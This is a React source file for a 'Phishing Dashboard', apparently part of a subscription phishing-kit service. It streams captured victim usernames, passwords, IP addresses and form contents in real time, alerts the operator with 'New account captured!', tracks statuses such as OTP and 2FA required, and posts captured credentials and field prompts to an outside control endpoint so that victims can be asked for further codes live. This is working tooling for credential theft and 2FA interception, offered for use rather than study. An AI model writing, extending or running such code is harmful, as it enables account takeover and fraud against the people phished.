import { useState, useEffect, useCallback, useRef } from 'react';
import { useTranslation } from 'react-i18next';
import { Page } from "components/shared/Page";
import { Card, Button, Table, THead, TBody, Tr, Th, Td } from "components/ui";
import { useThemeContext } from "app/contexts/theme/context";
import { useAuthContext } from "app/contexts/auth/context";
import SubscriptionGuard from "components/guards/SubscriptionGuard";
import { 
  ChartBarIcon,
  EyeIcon,
  UserIcon,
  GlobeAltIcon,
  ClockIcon
} from '@heroicons/react/24/outline';
import { toast } from 'sonner';
import { pusher } from 'configs/pusher.client.config.js';
import { formatTimeAgo } from 'utils/timeUtils';

export default function PhishingDashboard() {
  useThemeContext();
  const { isAuthenticated, isInitialized, user } = useAuthContext();
  const { t } = useTranslation();
  const [websites, setWebsites] = useState([]);
  const [accounts, setAccounts] = useState([]);
  const [isLoading, setIsLoading] = useState(true);
  const [stats, setStats] = useState({
    totalWebsites: 0,
    totalViews: 0,
    totalAccounts: 0,
    todayAccounts: 0
  });
  
  // Pusher refs
  const channelRef = useRef(null);
  const [pusherConnected, setPusherConnected] = useState(false);
  
  // Template fields state
  const [templateFields, setTemplateFields] = useState({});
  const [loadingFields, setLoadingFields] = useState({});
  

  // Debug function to check accounts state
  const debugAccounts = useCallback((accounts, message) => {
    console.log(`🔍 ${message}:`);
    console.log(`📊 Total accounts: ${accounts.length}`);
    console.log(`📋 Account IDs: [${accounts.map(acc => acc.id).join(', ')}]`);
    console.log(`📋 Account usernames: [${accounts.map(acc => acc.username).join(', ')}]`);
  }, []);

  // Pusher message handler
  const handlePusherMessage = useCallback((data) => {
    console.log('📨 Received Pusher message:', data);
    
    let newAccount = null;
    
    // Check if data has the correct structure
    if (data.account && data.timestamp) {
      // Direct account data (from PHP)
      newAccount = data.account;
    } else if (data.type && data.data && data.data.account) {
      // Structured data (from Node.js)
      newAccount = data.data.account;
    } else {
      console.log('Unknown Pusher message structure:', data);
      return;
    }
    
    if (newAccount) {
      console.log('📨 Processing new account:', newAccount);
      
      // Filter by user_id - only process accounts that belong to current user
      if (!user || !user.id) {
        console.log('❌ No user context available, skipping account processing');
        return;
      }
      
      // Check if this account belongs to current user's website
      if (newAccount.user_id && newAccount.user_id !== user.id) {
        console.log(`🚫 Account belongs to user ${newAccount.user_id}, current user is ${user.id}, skipping`);
        return;
      }
      
      console.log('✅ Account belongs to current user, processing...');
      
      // Check if account already exists - if yes, remove old and add new to top
      let isNewAccount = false;
      setAccounts(prevAccounts => {
        const safePrev = (prevAccounts || []).filter(Boolean);
        debugAccounts(safePrev, 'Before processing');

        const existingIndex = safePrev.findIndex(acc => acc.id === newAccount.id);
        console.log(`🔍 Looking for account ID ${newAccount.id}, found at index: ${existingIndex}`);
        
        if (existingIndex !== -1) {
          // Account exists, preserve initial_username and update current username
          console.log('🔄 Account exists, preserving initial username');
          console.log('📊 Old account:', safePrev[existingIndex]);
          console.log('📊 New account:', newAccount);
          
          // Preserve initial_username from first time
          const preservedInitialUsername = safePrev[existingIndex].initial_username || safePrev[existingIndex].username;
          
          // First remove the old account
          const accountsWithoutOld = safePrev.filter(acc => acc.id !== newAccount.id);
          console.log('🗑️ Removed old account, remaining accounts:', accountsWithoutOld.length);
          debugAccounts(accountsWithoutOld, 'After removing old account');
          
          // Then add the new account to the top with preserved initial_username
          const updatedAccount = {
            ...newAccount,
            initial_username: preservedInitialUsername, // Keep initial username
            current_username: newAccount.username // Latest username
          };
          const updatedAccounts = [updatedAccount, ...accountsWithoutOld].filter(Boolean);
          console.log('➕ Added updated account to top, total accounts:', updatedAccounts.length);
          debugAccounts(updatedAccounts, 'After adding updated account');
          
          return updatedAccounts.slice(0, 50); // Keep only last 50 accounts
        } else {
          // New account, add to top with initial_username
          isNewAccount = true;
          console.log('🆕 New account, adding to top');
          const newAccountWithInitial = {
            ...newAccount,
            initial_username: newAccount.username, // Save first username
            current_username: newAccount.username // Same as initial on first time
          };
          const updatedAccounts = [newAccountWithInitial, ...safePrev].filter(Boolean);
          debugAccounts(updatedAccounts, 'After adding new account');
          return updatedAccounts.slice(0, 50); // Keep only last 50 accounts
        }
          });
          
      // Update stats only for new accounts
      if (isNewAccount) {
          setStats(prevStats => ({
            ...prevStats,
            totalAccounts: prevStats.totalAccounts + 1,
            todayAccounts: prevStats.todayAccounts + 1
          }));
      }
      
      // Play sound notification
      try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        // Create a pleasant notification sound
        oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
        oscillator.frequency.setValueAtTime(1000, audioContext.currentTime + 0.1);
        oscillator.frequency.setValueAtTime(1200, audioContext.currentTime + 0.2);
        
        gainNode.gain.setValueAtTime(0, audioContext.currentTime);
        gainNode.gain.linearRampToValueAtTime(0.3, audioContext.currentTime + 0.01);
        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
        
        oscillator.start(audioContext.currentTime);
        oscillator.stop(audioContext.currentTime + 0.5);
      } catch (e) {
        console.log('Sound not available:', e);
      }
      
      // Show success toast
      toast.success('New account captured!', {
        description: `${newAccount.username} from ${newAccount.website_title || 'Unknown Site'}`,
        duration: 5000
      });
    }
  }, [debugAccounts, user]);

  // Pusher connection function
  const connectPusher = useCallback(() => {
    if (!pusher || !pusher.connection) {
      console.log('⚠️ Pusher is not configured, skipping connection');
      return;
    }
    if (channelRef.current) {
      console.log('📡 Pusher already connected, skipping...');
      return;
    }

    try {
      console.log('🔧 Initializing Pusher connection...');
      console.log('📡 Pusher config:', {
        key: pusher.key,
        cluster: pusher.config.cluster,
        useTLS: pusher.config.useTLS
      });
      console.log('📡 Pusher state:', pusher.connection?.state);
      
      // Subscribe to user-specific phishing dashboard channel
      const userChannel = `phishing-dashboard-user-${user?.id || 'unknown'}`;
      channelRef.current = pusher.subscribe(userChannel);
      console.log(`📡 Subscribed to ${userChannel} channel`);
      
      // Handle connection state
      pusher.connection.bind('connected', () => {
        console.log('✅ Pusher connected to phishing dashboard');
        setPusherConnected(true);
        toast.success('Connected to real-time updates');
      });

      pusher.connection.bind('disconnected', () => {
        console.log('❌ Pusher disconnected from phishing dashboard');
        setPusherConnected(false);
        toast.error('Disconnected from real-time updates');
      });

      pusher.connection.bind('error', (error) => {
        console.error('💥 Pusher error:', error);
        setPusherConnected(false);
        toast.error('Pusher connection error');
      });

      pusher.connection.bind('connecting', () => {
        console.log('🔄 Pusher connecting...');
        setPusherConnected(false);
      });

      pusher.connection.bind('unavailable', () => {
        console.log('⚠️ Pusher unavailable');
        setPusherConnected(false);
        toast.warning('Pusher service unavailable');
      });

      // Listen for new account events
      channelRef.current.bind('new_account', (data) => {
        console.log('📨 Received new account event:', data);
        handlePusherMessage(data);
      });

      // Listen for account updated events
      channelRef.current.bind('account_updated', (data) => {
        console.log('📨 Received account updated event:', data);
        handlePusherMessage(data);
      });

      // Listen for account deleted events
      channelRef.current.bind('account_deleted', (data) => {
        console.log('📨 Received account deleted event:', data);
        handlePusherMessage(data);
      });

      // Check connection state after a short delay
      setTimeout(() => {
        const state = pusher.connection?.state;
        console.log('📡 Pusher connection state after delay:', state);
        if (state === 'connected') {
          setPusherConnected(true);
        }
      }, 1000);

    } catch (error) {
      console.error('💥 Failed to connect Pusher:', error);
      setPusherConnected(false);
      toast.error('Failed to connect to Pusher');
    }
  }, [handlePusherMessage, user?.id]);

  // Fetch template fields for a website
  const fetchTemplateFields = useCallback(async (websiteId) => {
    if (templateFields[websiteId] || loadingFields[websiteId]) {
      return templateFields[websiteId];
    }

    setLoadingFields(prev => ({ ...prev, [websiteId]: true }));

    try {
      const response = await fetch(`/api/template-fields/${websiteId}`);
      const result = await response.json();

      if (result.success) {
        setTemplateFields(prev => ({
          ...prev,
          [websiteId]: result.data.fields
        }));
        return result.data.fields;
      }
        } catch (error) {
      console.error('Error fetching template fields:', error);
    } finally {
      setLoadingFields(prev => ({ ...prev, [websiteId]: false }));
    }

    return [];
  }, [templateFields, loadingFields]);

  // Load template fields only for new accounts (not all websites)
  useEffect(() => {
    if (accounts && accounts.length > 0) {
      const uniqueWebsiteIds = [...new Set(accounts.map(acc => acc.website))];
      uniqueWebsiteIds.forEach(websiteId => {
        if (!templateFields[websiteId] && !loadingFields[websiteId]) {
          console.log('🔄 Loading template fields for website ID:', websiteId);
          fetchTemplateFields(websiteId);
        }
      });
    }
  }, [accounts, templateFields, loadingFields, fetchTemplateFields]);

  // Handle sending data back to victim
  const handleSendToVictim = useCallback(async (fieldIds, account) => {
    try {
      console.log('🚀 Sending account data to control.php:', {
        account: account,
        fieldIds: fieldIds
      });

      // Prepare the data to send (same format as received via Pusher)
      const dataToSend = {
        type: 'new_account',
        data: {
          account: {
            id: account.id,
            username: account.username,
            password: account.password,
            email: account.email,
            website: account.website,
            website_title: account.website_title,
            ip_address: account.ip_address,
            status: account.status,
            content: account.content,
            created_at: account.created_at
          },
          timestamp: new Date().toISOString(),
          fieldIds: fieldIds // Include which fields were selected
        }
      };

      // Send to control.php
      const response = await fetch('https://api.scanvia.org/control.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(dataToSend)
      });

      if (response.ok) {
        const result = await response.json();
        console.log('✅ Successfully sent to control.php:', result);
        
        toast.success('Data sent to victim successfully', {
          description: `Sent field: ${fieldIds.join(', ')} for account ${account.username}`
        });
      } else {
        console.error('❌ Error response from control.php:', response.status, response.statusText);
        toast.error('Failed to send data to victim', {
          description: `Server responded with ${response.status}`
        });
      }

    } catch (error) {
      console.error('💥 Error sending to victim:', error);
      toast.error('Failed to send data to victim', {
        description: error.message
      });
    }
  }, []);

  // Copy to clipboard function
  const copyToClipboard = useCallback(async (text, label) => {
    try {
      await navigator.clipboard.writeText(text);
      toast.success(`${label} copied to clipboard`, {
        description: text
      });
    } catch (error) {
      console.error('Failed to copy:', error);
      toast.error('Failed to copy to clipboard');
    }
  }, []);

  // Parse JSON content function
  const parseContent = useCallback((content) => {
    if (!content) return null;
    
    try {
      // Try to parse as JSON
      const parsed = JSON.parse(content);
      return parsed;
    } catch {
      // If not JSON, return as string
      return content;
    }
  }, []);

  // Format content for display (simple text, click to copy)
  const formatContent = useCallback((content) => {
    const parsed = parseContent(content);
    
    if (typeof parsed === 'object' && parsed !== null) {
      // Convert object to readable string
      const contentString = Object.entries(parsed)
        .map(([key, value]) => `${key}: ${value}`)
        .join(', ');
      
      return (
        <span
          className="cursor-pointer hover:bg-gray-100 px-2 py-1 rounded text-sm"
          onClick={() => copyToClipboard(contentString)}
          title={`Click to copy: ${contentString}`}
        >
          {contentString}
        </span>
      );
    } else {
      // If it's a string, return as is
      return (
        <span
          className="cursor-pointer hover:bg-gray-100 px-2 py-1 rounded text-sm"
          onClick={() => copyToClipboard(String(parsed))}
          title={`Click to copy: ${String(parsed)}`}
        >
          {String(parsed)}
        </span>
      );
    }
  }, [parseContent, copyToClipboard]);

  // Debug accounts state changes
  useEffect(() => {
    debugAccounts(accounts, 'Accounts state changed');
  }, [accounts, debugAccounts]);


  // Redirect if not authenticated
  useEffect(() => {
    if (isInitialized && !isAuthenticated) {
      toast.error('Please log in to access the phishing dashboard');
      window.location.href = '/login';
    }
  }, [isAuthenticated, isInitialized]);

  const loadDashboardData = useCallback(async () => {
    try {
      setIsLoading(true);
      const token = localStorage.getItem('authToken');
      
      if (!token) {
        toast.error('Please log in to access the dashboard');
        return;
      }
      
      // Load websites
      const websitesResponse = await fetch('/api/phishing/websites', {
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      });
      
      let websitesData = [];
      if (websitesResponse.ok) {
        const response = await websitesResponse.json();
        websitesData = response.data || [];
        setWebsites(websitesData);
      } else if (websitesResponse.status === 401 || websitesResponse.status === 403) {
        toast.error('Authentication failed. Please log in again.');
        localStorage.removeItem('authToken');
        return;
      } else {
        console.error('Failed to load websites:', websitesResponse.status);
        toast.error('Failed to load websites');
      }

      // Don't load old accounts - start fresh for real-time only
      console.log('📊 Starting with empty accounts list - waiting for real-time updates');
      setAccounts([]); // Start with empty list

      // Calculate stats (start with 0 for accounts since we're not loading old data)
      const totalWebsites = websitesData.length;
      const totalViews = websitesData.reduce((sum, site) => sum + (site.view_count || 0), 0);
      const totalAccounts = 0; // Start with 0, will be updated by real-time data
      const todayAccounts = 0; // Start with 0, will be updated by real-time data

      setStats({
        totalWebsites,
        totalViews,
        totalAccounts,
        todayAccounts
      });

    } catch (error) {
      console.error('Error loading dashboard data:', error);
      toast.error('Failed to load dashboard data');
    } finally {
      setIsLoading(false);
    }
  }, []); // Remove accounts dependency to prevent infinite loop

  // Refresh only stats and websites (preserve accounts data)
  const refreshStats = useCallback(async () => {
    try {
      const token = localStorage.getItem('authToken');
      
      if (!token) {
        toast.error('Please log in to access the dashboard');
        return;
      }
      
      // Load websites (safe to refresh)
      const websitesResponse = await fetch('/api/phishing/websites', {
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      });
      
      if (websitesResponse.ok) {
        const response = await websitesResponse.json();
        const websitesData = response.data || [];
        setWebsites(websitesData);
        
        // Update stats
        setStats(prevStats => ({
          ...prevStats,
          totalWebsites: websitesData.length,
          totalViews: websitesData.reduce((sum, site) => sum + (site.view_count || 0), 0)
        }));
        
        toast.success('Stats refreshed successfully');
      }
      
    } catch (error) {
      console.error('Error refreshing stats:', error);
      toast.error('Failed to refresh stats');
    }
  }, []);

  // Load initial data only once when component mounts
  useEffect(() => {
    if (isAuthenticated && isInitialized) {
      loadDashboardData();
    }
  }, [isAuthenticated, isInitialized, loadDashboardData]);

  // Connect Pusher when authenticated
  useEffect(() => {
    if (isAuthenticated && isInitialized && pusher?.connection) {
      console.log('🔧 Starting Pusher connection...');
      connectPusher();

      // Check connection status after a short delay
      setTimeout(() => {
        console.log('📡 Pusher connection state:', pusher.connection?.state);
      }, 2000);
    }

    return () => {
      if (channelRef.current && pusher?.connection) {
        const userChannel = `phishing-dashboard-user-${user?.id || 'unknown'}`;
        pusher.unsubscribe(userChannel);
        channelRef.current = null;
      }
    };
  }, [isAuthenticated, isInitialized, connectPusher, user]);

  const getStatusColor = (status) => {
    const colors = {
      'success': 'success',
      'wrong-pass': 'error',
      'otp-mail': 'warning',
      'otp-phone': 'warning',
      'otp-2fa': 'warning',
      'order-device': 'info',
      'require-pass': 'neutral',
      'require-mail': 'neutral'
    };
    return colors[status] || 'neutral';
  };

  const getStatusText = (status) => {
    const texts = {
      'success': 'Success',
      'wrong-pass': 'Wrong Password',
      'otp-mail': 'OTP Email',
      'otp-phone': 'OTP Phone',
      'otp-2fa': '2FA Required',
      'order-device': 'Order Device',
      'require-pass': 'Require Password',
      'require-mail': 'Require Email'
    };
    return texts[status] || status;
  };

  // Show loading while checking authentication
  if (!isInitialized || isLoading) {
    return (
      <Page title="Phishing Dashboard">
        <div className="flex items-center justify-center min-h-screen">
          <div className="animate-spin rounded-full h-32 w-32 border-b-2 border-blue-600"></div>
        </div>
      </Page>
    );
  }

  // Don't render if not authenticated (will redirect)
  if (!isAuthenticated) {
    return null;
  }

  return (
    <SubscriptionGuard>
      <Page title="Phishing Dashboard">
        <div className="transition-content w-full px-(--margin-x) pt-5 lg:pt-6">
          <div className="min-w-0">
            {/* Header */}
            <div className="mb-8">
              <div className="relative overflow-hidden rounded-3xl border border-gray-200/60 bg-gradient-to-br from-white/80 via-white/60 to-white/30 p-6 shadow-soft ring-1 ring-gray-900/5 backdrop-blur-2xl dark:border-white/10 dark:from-dark-800/60 dark:via-dark-800/40 dark:to-dark-800/20 dark:ring-white/10">
                <div className="pointer-events-none absolute -top-24 -right-24 h-64 w-64 rounded-full bg-gradient-to-br from-primary-500/20 to-secondary-500/10 blur-3xl" />
                <div className="pointer-events-none absolute -bottom-24 -left-24 h-64 w-64 rounded-full bg-gradient-to-tr from-sky-500/15 to-primary-500/10 blur-3xl" />

                <div className="relative flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
                  <div className="flex items-start gap-4">
                    <div className="rounded-2xl bg-white/50 p-3 ring-1 ring-gray-900/5 backdrop-blur-xl dark:bg-dark-800/40 dark:ring-white/10">
                      <ChartBarIcon className="h-6 w-6 text-primary-600 dark:text-primary-400" />
                    </div>

                    <div className="min-w-0">
                      <div className="flex flex-wrap items-center gap-3">
                        <h1 className="text-3xl font-bold text-gray-900 dark:text-white">
                          {t('pages.phishing.dashboard.title')}
                        </h1>

                        <div className="inline-flex items-center gap-2 rounded-full border border-gray-200/60 bg-white/60 px-3 py-1 text-sm backdrop-blur-xl dark:border-white/10 dark:bg-dark-800/40">
                          <span className={`h-2 w-2 rounded-full ${pusherConnected ? 'bg-green-500' : 'bg-red-500'}`} />
                          <span className={pusherConnected ? 'text-green-700 dark:text-green-300' : 'text-red-700 dark:text-red-300'}>
                            {pusherConnected ? t('pages.phishing.dashboard.live') : t('pages.phishing.dashboard.offline')}
                          </span>
                          <span className="text-xs text-gray-500 dark:text-gray-400">
                            ({pusher?.connection?.state || 'not-configured'})
                          </span>
                        </div>
                      </div>

                      <p className="mt-2 text-gray-600 dark:text-gray-400">
                        {t('pages.phishing.dashboard.subtitle')}
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>

          {/* Stats Cards */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
            <Card className="p-6 transition-transform duration-300 hover:-translate-y-0.5 hover:shadow-soft">
              <div className="flex items-center">
                <div className="rounded-2xl bg-white/60 p-3 ring-1 ring-gray-900/5 backdrop-blur-xl dark:bg-dark-800/40 dark:ring-white/10">
                  <GlobeAltIcon className="h-6 w-6 text-blue-600 dark:text-blue-400" />
                </div>
                <div className="ml-4">
                  <p className="text-sm font-medium text-gray-600 dark:text-gray-400">{t('pages.phishing.dashboard.totalWebsites')}</p>
                  <p className="text-2xl font-bold text-gray-900 dark:text-white">{stats.totalWebsites}</p>
                </div>
              </div>
            </Card>

            <Card className="p-6 transition-transform duration-300 hover:-translate-y-0.5 hover:shadow-soft">
              <div className="flex items-center">
                <div className="rounded-2xl bg-white/60 p-3 ring-1 ring-gray-900/5 backdrop-blur-xl dark:bg-dark-800/40 dark:ring-white/10">
                  <EyeIcon className="h-6 w-6 text-green-600 dark:text-green-400" />
                </div>
                <div className="ml-4">
                  <p className="text-sm font-medium text-gray-600 dark:text-gray-400">{t('pages.phishing.dashboard.totalViews')}</p>
                  <p className="text-2xl font-bold text-gray-900 dark:text-white">{stats.totalViews}</p>
                </div>
              </div>
            </Card>

            <Card className="p-6 transition-transform duration-300 hover:-translate-y-0.5 hover:shadow-soft">
              <div className="flex items-center">
                <div className="rounded-2xl bg-white/60 p-3 ring-1 ring-gray-900/5 backdrop-blur-xl dark:bg-dark-800/40 dark:ring-white/10">
                  <UserIcon className="h-6 w-6 text-purple-600 dark:text-purple-400" />
                </div>
                <div className="ml-4">
                  <p className="text-sm font-medium text-gray-600 dark:text-gray-400">{t('pages.phishing.dashboard.totalAccounts')}</p>
                  <p className="text-2xl font-bold text-gray-900 dark:text-white">{stats.totalAccounts}</p>
                </div>
              </div>
            </Card>

            <Card className="p-6 transition-transform duration-300 hover:-translate-y-0.5 hover:shadow-soft">
              <div className="flex items-center">
                <div className="rounded-2xl bg-white/60 p-3 ring-1 ring-gray-900/5 backdrop-blur-xl dark:bg-dark-800/40 dark:ring-white/10">
                  <ClockIcon className="h-6 w-6 text-orange-600 dark:text-orange-400" />
                </div>
                <div className="ml-4">
                  <p className="text-sm font-medium text-gray-600 dark:text-gray-400">{t('pages.phishing.dashboard.todayAccounts')}</p>
                  <p className="text-2xl font-bold text-gray-900 dark:text-white">{stats.todayAccounts}</p>
                </div>
              </div>
            </Card>
          </div>

          {/* Recent Accounts */}
          <Card className="p-6">
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-lg font-semibold text-gray-900 dark:text-white">
                {t('pages.phishing.dashboard.recentAccounts')}
              </h3>
              <Button
                variant="outlined"
                color="primary"
                onClick={refreshStats}
              >
                Refresh Stats
              </Button>
            </div>

            <div className="overflow-x-auto rounded-2xl border border-gray-200/60 bg-white/40 backdrop-blur-xl dark:border-white/10 dark:bg-dark-800/30">
              <Table>
                <THead>
                  <Tr>
                    <Th>{t('pages.phishing.dashboard.username')}</Th>
                    <Th>Account</Th>
                    <Th>{t('pages.phishing.dashboard.password')}</Th>
                    <Th>{t('pages.phishing.dashboard.content')}</Th>
                    <Th>{t('pages.phishing.dashboard.website')}</Th>
                    <Th>{t('pages.phishing.dashboard.ipAddress')}</Th>
                    <Th>{t('pages.phishing.dashboard.capturedAt')}</Th>
                    <Th>{t('pages.phishing.dashboard.status')}</Th>
                    <Th>{t('pages.phishing.dashboard.action')}</Th>
                  </Tr>
                </THead>
                <TBody>
                  {accounts && accounts.length > 0 ? (
                    accounts.slice(0, 10).map((account) => (
                      <Tr key={account.id || Math.random()}>
                        <Td className="font-medium">
                          <button
                            onClick={() => copyToClipboard(account.initial_username || account.username || '', 'Initial Username')}
                            className="text-left hover:text-blue-600 dark:hover:text-blue-400 cursor-pointer transition-colors"
                            title="Click to copy (Initial username)"
                          >
                          {account.initial_username || account.username || 'N/A'}
                          </button>
                        </Td>
                        <Td className="font-medium">
                          <button
                            onClick={() => copyToClipboard(account.current_username || account.username || '', 'Current Account')}
                            className="text-left hover:text-blue-600 dark:hover:text-blue-400 cursor-pointer transition-colors"
                            title="Click to copy (Latest username)"
                          >
                          {account.current_username || account.username || 'N/A'}
                          </button>
                        </Td>
                        <Td className="font-mono text-sm">
                          <button
                            onClick={() => copyToClipboard(account.password || '', 'Password')}
                            className="text-left hover:text-blue-600 dark:hover:text-blue-400 cursor-pointer transition-colors"
                            title="Click to copy"
                          >
                            {account.password || 'N/A'}
                          </button>
                        </Td>
                        <Td className="text-sm max-w-xs">
                          {account.content ? (
                            <div>
                              {formatContent(account.content)}
                            </div>
                          ) : (
                            <span className="text-gray-500 dark:text-gray-400">N/A</span>
                          )}
                        </Td>
                        <Td>
                          {account.website_title || (websites && websites.find ? websites.find(w => w.id === account.website)?.title || 'Unknown' : 'Unknown')}
                        </Td>
                        <Td className="font-mono text-sm">
                          <button
                            onClick={() => copyToClipboard(account.ip_address || '', 'IP Address')}
                            className="text-left hover:text-blue-600 dark:hover:text-blue-400 cursor-pointer transition-colors"
                            title="Click to copy"
                          >
                          {account.ip_address || 'N/A'}
                          </button>
                        </Td>
                        <Td className="text-sm">
                          {account.created_at ? formatTimeAgo(account.created_at) : 'N/A'}
                        </Td>
                        <Td>
                          <span 
                            className={`inline-flex items-center px-2 py-1 rounded-full text-xs font-medium ${getStatusColor(account.status)}`}
                          >
                            {getStatusText(account.status)}
                          </span>
                        </Td>
                        <Td>
                          <div className="flex flex-wrap gap-1">
                            {loadingFields[account.website] ? (
                              <span className="text-xs text-gray-500">Loading...</span>
                            ) : (
                              templateFields[account.website]?.map((field) => (
                                <button
                                  key={field.id}
                                  onClick={() => handleSendToVictim([field.placeholder], account)}
                                  className="inline-flex items-center px-2 py-1 rounded-full text-xs font-medium bg-blue-100 text-blue-800 hover:bg-blue-200 dark:bg-blue-900 dark:text-blue-200 dark:hover:bg-blue-800 cursor-pointer transition-colors"
                                  title={`Click to send ${field.name} to victim`}
                                >
                                  {field.name}
                                </button>
                              )) || (
                                <span className="text-xs text-gray-500">No fields</span>
                              )
                            )}
                          </div>
                        </Td>
                      </Tr>
                    ))
                  ) : (
                    <Tr>
                      <Td colSpan={8} className="text-center py-12">
                        <div className="flex flex-col items-center">
                          <div className="flex items-center gap-2 mb-2">
                            <div className={`w-3 h-3 rounded-full ${pusherConnected ? 'bg-green-500 animate-pulse' : 'bg-red-500'}`}></div>
                            <span className="text-lg font-medium text-gray-600 dark:text-gray-400">
                              {pusherConnected ? t('pages.phishing.dashboard.waitingForVictims') : t('pages.phishing.dashboard.connectingRealtime')}
                            </span>
                          </div>
                          <p className="text-sm text-gray-500 dark:text-gray-500">
                            {pusherConnected 
                              ? t('pages.phishing.dashboard.waitingDescription')
                              : t('pages.phishing.dashboard.connectingDescription')
                            }
                          </p>
                        </div>
                      </Td>
                    </Tr>
                  )}
                </TBody>
              </Table>
            </div>
          </Card>
        </div>
      </div>

      </Page>
    </SubscriptionGuard>
  );
}
